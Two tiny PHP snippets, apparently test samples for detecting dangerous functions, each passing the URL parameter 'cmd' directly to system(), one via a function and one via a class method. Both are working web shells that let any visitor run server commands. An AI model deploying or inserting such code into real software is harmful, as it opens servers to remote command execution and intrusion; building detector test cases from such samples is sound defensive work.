<?php
//最简单文件检测
$cmd = $_GET['cmd'];
function echo_network($ip)
{
    system($ip);
}
echo_network($cmd);
?>


<?php
// 最简单的对象调用危险函数
class People{
    public $name;

    public function show_name($name){
        system($name);
    }
}
$cmd = $_GET['cmd'];
//$cmd = "whoami";
$people = new People();
$people->show_name($cmd)
?>